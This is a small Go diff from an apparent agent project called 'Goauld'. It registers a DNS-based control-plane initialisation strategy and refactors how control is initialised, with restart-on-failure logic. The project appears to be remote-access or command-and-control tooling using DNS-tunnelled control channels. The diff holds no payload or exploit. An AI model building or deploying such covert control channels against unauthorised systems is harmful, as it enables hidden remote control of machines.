@@ -4,6 +4,7 @@ package main
 
 import (
 	globalcontext "Goauld/agent/context"
+	"Goauld/agent/control"
 	"Goauld/agent/ssh/transport"
 	"context"
 	"fmt"
@@ -107,7 +108,14 @@ func run() globalcontext.CancelReason {
 	}
 	defer cancel()
 
-	success, controlPlanClient := InitControl(ctx, dnsTransport, globalCanceler, dropDone, controlErr)
+	controlInitStrategy["DNS"] = control.InitStrategy{
+		Name: "DNS",
+		InitFunc: func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
+			return client.InitControlOverDNSAlt(success, chanErr)
+		},
+	}
+
+	success, controlPlanClient := InitControl(ctx, globalCanceler, dropDone, controlErr)
 
 	// If no strategy was successful, we restart the agent
 	if !success {
